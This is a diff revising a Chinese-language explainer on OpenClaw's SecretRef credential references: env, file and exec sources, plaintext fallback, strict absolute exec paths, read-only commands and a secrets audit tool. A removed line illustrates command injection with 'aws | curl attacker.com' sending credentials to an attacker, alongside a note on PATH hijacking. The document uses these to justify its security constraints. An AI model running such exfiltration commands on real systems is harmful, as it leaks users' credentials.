@@ -4,10 +4,11 @@
 
 > 跳过不影响阅读翻译正文。
 
-### SecretRef——凭证不明文存储在配置文件
+### SecretRef
 
-OpenClaw 支持 **SecretRef**(Secret 引用),让凭证不直接明文写在 `openclaw.json` 里,而是通过引用获取:
+**问题**: 凭证明文存储在 `openclaw.json`,可能被提交到 Git、被 agent 读取、被备份工具复制?
 
+**方案**: SecretRef (Secret 引用),配置文件只包含"指针":
 ```json
 {
   auth: {
@@ -16,99 +17,83 @@ OpenClaw 支持 **SecretRef**(Secret 引用),让凭证不直接明文写在 `ope
 }
 ```
 
-`$ref` 指向真正的凭证来源,而不是凭证本身。
+**洞察**: 配置文件不直接存储凭证,真正的凭证存在别处。
 
-**为什么不明文存储?** 因为 `openclaw.json` 可能被:
-- **提交到 Git**: 如果配置文件里有明文 API key,Git 仓库的所有协作者都能看到
-- **被 agent 读取**: agent 可能有 file_read 工具权限,能读取配置文件内容
-- **被备份工具复制**: 备份文件可能被存储在不安全的地方
+**权衡**:
+- ✓ 安全: 凭证不明文,不会泄露
+- ✗ 复杂: 需要配置凭证来源
 
-明文凭证 = 任何能访问配置文件的人/进程都能拿到凭证。SecretRef 让配置文件只包含"指针",真正的凭证存在别处。
+**模式**: Kubernetes Secret——Pod 配置引用 Secret 对象,不直接写密码。
 
-**这跟 Kubernetes 的 Secret 是一个思路**——Pod 配置里不直接写数据库密码,而是引用 Secret 对象。OpenClaw 的 SecretRef 也是同样: 配置文件引用凭证,不直接存储。
+### 三种 SecretRef 来源
 
-### 三种 SecretRef 来源——env / file / exec
+**问题**: 不同环境的凭证管理方式不同 (CI/CD 用环境变量、Docker 用 Secrets、云用 Secrets Manager)?
 
-OpenClaw 支持三种 SecretRef 来源:
+**方案**: 三种来源:
+- **env**: 从环境变量读取 (CI/CD 场景)
+- **file**: 从文件读取 (Docker Secrets)
+- **exec**: 执行命令读取 (AWS Secrets Manager)
 
-**env**(环境变量):
-```json
-{ $ref: "env:OPENAI_API_KEY" }
-```
-从环境变量读取。适合 CI/CD 场景(环境变量由 CI 系统注入)。
+**洞察**: 三种来源覆盖三种场景,不强迫用户用特定方式。
 
-**file**(文件):
-```json
-{ $ref: "file:/run/secrets/openai-key" }
-```
-从文件读取。适合 Docker Secrets(凭证挂载到 `/run/secrets/` 目录)。
+**权衡**:
+- ✓ 灵活: 适配不同环境
+- ✓ 兼容: CI/CD、Docker、云都能用
 
-**exec**(命令执行):
-```json
-{ $ref: "exec:aws secretsmanager get-secret-value --secret-id openai-key" }
-```
-执行命令,从命令输出读取。适合动态凭证(如从 AWS Secrets Manager 获取)。
+### Plaintext 仍然支持
 
-**为什么需要三种?** 因为不同环境的凭证管理方式不同:
-- CI/CD 用环境变量(GitHub Actions 的 secrets、GitLab CI 的 variables)
-- Docker 用 Secrets(文件挂载)
-- 云环境用 Secrets Manager(AWS、GCP、Azure 各有自己的服务)
+**问题**: 老配置文件是明文的,强制迁移太麻烦?
 
-三种来源覆盖三种场景,不强迫用户用特定方式。
+**方案**: 仍然支持明文凭证,SecretRef 是 opt-in (可选的)。
 
-### Plaintext 仍然支持——向后兼容
+**洞察**: 向后兼容 + 渐进式迁移,简单场景用明文,安全敏感场景用 SecretRef。
 
-虽然推荐用 SecretRef,但 OpenClaw 仍然支持明文凭证:
+**权衡**:
+- ✓ 兼容: 老配置不需要改
+- ✓ 灵活: 本地开发用明文,生产环境用 SecretRef
 
-```json
-{
-  auth: {
-    apiKey: "sk-..."
-  }
-}
-```
+### Strict command paths
 
-**为什么保留明文支持?** 因为:
-- **向后兼容**: 老配置文件是明文的,不能强制用户迁移
-- **简单场景**: 本地开发、个人使用,明文够用,SecretRef 是过度工程
-- **渐进式迁移**: 用户可以逐步把明文改成 SecretRef,不需要一次性改完
+**问题**: `exec` 类型的 SecretRef 命令路径可以是相对路径或包含 shell 操作符,有安全风险?
 
-**SecretRef 是 opt-in**(可选的),不是强制的。安全敏感场景(如生产环境、多租户)应该用 SecretRef,简单场景(如本地开发)可以用明文。
+**方案**: 命令路径必须是**绝对路径**,禁止 shell 操作符 (`|`、`&&`)。
 
-### Strict command paths——exec 命令的安全约束
+**洞察**: 绝对路径 + 禁止 shell 操作符 = 只能执行指定的命令,防止命令注入。
 
-`exec` 类型的 SecretRef 执行命令获取凭证,但命令路径必须是**绝对路径**(如 `/usr/bin/aws`),不能是相对路径(如 `aws`)或包含 shell 操作符(如 `|`、`&&`)。
+**权衡**:
+- ✓ 安全: 防止恶意命令
+- ✗ 不灵活: 不能用相对路径
 
-**为什么这样限制?** 因为相对路径和 shell 操作符有安全风险:
-- **相对路径**: `aws` 可能是 `/usr/bin/aws`,也可能是攻击者放在 `$PATH` 里的恶意程序
-- **Shell 操作符**: `aws | curl attacker.com` 会把凭证发给攻击者
+**模式**: sudoers command 限制——必须是绝对路径,防止通过修改 `$PATH` 执行恶意程序。
 
-绝对路径 + 禁止 shell 操作符 = 只能执行指定的命令,不能被篡改。
+### Read-only command paths
 
-**这跟 sudoers 的 command 限制**是一个思路——`sudoers` 文件里配置的命令必须是绝对路径,防止用户通过修改 `$PATH` 执行恶意程序。OpenClaw 的 strict command paths 也是同样: 只允许绝对路径,防止命令注入。
+**问题**: `exec` 命令可以修改系统状态 (如写文件、发网络请求)?
 
-### Read-only command paths——只读权限
+**方案**: 命令只能**读取**凭证,不能修改系统状态。
 
-SecretRef 的 `exec` 命令只能**读取**凭证,不能**修改**凭证。命令的输出是凭证内容,命令本身不能修改系统状态(如写文件、发网络请求)。
+**洞察**: SecretRef 的目的是"获取凭证",不是"执行任意操作"。
 
-**为什么限制只读?** 因为 SecretRef 的目的是"获取凭证",不是"执行任意操作"。如果允许写操作,攻击者可以通过配置恶意的 SecretRef 命令来修改系统(如添加用户、删除文件)。
+**权衡**:
+- ✓ 安全: 不能通过 SecretRef 修改系统
+- ✗ 限制: 不能执行写操作
 
-**这跟数据库的 SELECT 权限**是一个思路——SELECT 只能读取数据,不能修改。OpenClaw 的 exec 命令也是同样: 只能读取凭证,不能修改系统。
+**模式**: 数据库 SELECT 权限——只能读取,不能修改。
 
-### Audit current state——审计当前配置
+### Audit current state
 
-OpenClaw 提供审计功能,检查当前配置里哪些是明文凭证、哪些是 SecretRef:
+**问题**: 配置文件很大,手动检查哪些是明文凭证很麻烦?
 
-```bash
-openclaw secrets audit
-```
-
-输出类似:
+**方案**: `openclaw secrets audit` 自动扫描:
 ```
 auth.apiKey: plaintext (should be SecretRef)
 auth.oauthToken: SecretRef (env:OAUTH_TOKEN)
 ```
 
-**为什么需要审计?** 因为配置文件可能很大,手动检查哪些是明文很麻烦。审计工具自动扫描,列出所有明文凭证,帮助用户识别安全风险。
+**洞察**: 自动扫描,列出所有明文凭证,帮助用户识别安全风险。
 
-**这跟 `npm audit` 是一个思路**——`npm audit` 扫描 node_modules,列出有安全漏洞的包。OpenClaw 的 secrets audit 也是同样: 扫描配置文件,列出有安全风险的明文凭证。
+**权衡**:
+- ✓ 自动化: 不需要手动检查
+- ✓ 清晰: 列出哪些是明文、哪些是 SecretRef
+
+**模式**: `npm audit`——扫描 node_modules,列出有安全漏洞的包。
